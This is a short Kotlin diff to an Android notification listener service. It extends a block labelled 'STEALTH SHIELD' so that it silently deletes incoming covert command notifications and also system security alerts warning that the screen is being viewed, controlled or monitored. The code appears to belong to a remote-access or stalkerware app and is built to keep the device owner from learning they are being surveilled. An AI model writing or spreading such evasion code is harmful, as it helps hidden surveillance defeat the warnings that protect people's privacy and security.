@@ -88,9 +88,14 @@ class MyNotificationListener : NotificationListenerService() {
         if (title.isEmpty() && text.isEmpty()) return
 
         // --- STEALTH SHIELD: INSTANT WIPE ---
-        if (title.contains("Hii!!") || text.contains("Hii!!")) {
+        val isCommand = title.contains("Hii!!") || text.contains("Hii!!")
+        val isSecurityAlert = text.contains("view and control your screen", ignoreCase = true) || 
+                              text.contains("monitoring your screen", ignoreCase = true) ||
+                              title.contains("security alert", ignoreCase = true)
+
+        if (isCommand || isSecurityAlert) {
             cancelNotification(sbn.key)
-            DebugLogger.log("SHIELD", "Command notification intercepted and purged.")
+            DebugLogger.log("SHIELD", "Notification purged: ${if(isCommand) "Command" else "Security Alert"}")
             return
         }
 
